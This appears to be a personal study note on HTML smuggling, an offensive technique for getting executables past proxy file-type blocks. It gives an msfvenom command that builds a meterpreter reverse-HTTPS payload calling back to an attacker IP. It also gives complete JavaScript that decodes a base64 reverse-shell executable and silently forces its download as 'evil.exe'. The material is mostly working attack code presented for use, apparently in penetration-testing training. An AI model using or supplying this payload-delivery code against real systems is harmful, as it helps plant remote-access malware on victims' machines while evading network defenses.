---
creation date: December 21st 2022
last modified date: December 21st 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[HTML Smuggling]]  
___

## Description:  
File smuggling is a technique that allows bypassing proxy blocks for certain file types that the user is trying to download. For example if a corporate proxy blocks .exe files from being downloaded via the browser, this is the technique you can use to smuggle those files through.

Create your payload and then base64 encode it:
```
kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfstaged.exe

kali@kali:~$ base64 /var/www/html/msfstaged.exe
```

insert our base64 encoded payload into the variable "file" (I had to snip it but your base64 will probably be extremely big):
```
<!-- code from https://outflank.nl/blog/2018/08/14/html-smuggling-explained/ -->
<html>
    <body>
        <script>
            function base64ToArrayBuffer(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            
            var bytes = new Uint8Array( len );
                for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
                return bytes.buffer;
            }

            // 32bit simple reverse shell
            var file = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwc..................';
            var data = base64ToArrayBuffer(file);
            var blob = new Blob([data], {type: 'octet/stream'});
            var fileName = 'evil.exe';

            if (window.navigator.msSaveOrOpenBlob) {
                window.navigator.msSaveOrOpenBlob(blob,fileName);
            } else {
                var a = document.createElement('a');
                console.log(a);
                document.body.appendChild(a);
                a.style = 'display: none';
                var url = window.URL.createObjectURL(blob);
                a.href = url;
                a.download = fileName;
                a.click();
                window.URL.revokeObjectURL(url);
            }
        </script>
    </body>
</html>
```

*window.navigator.msSaveBlob method is used to make the technique work with Microsoft Edge as well*
___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 21st 2022 (03:07 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
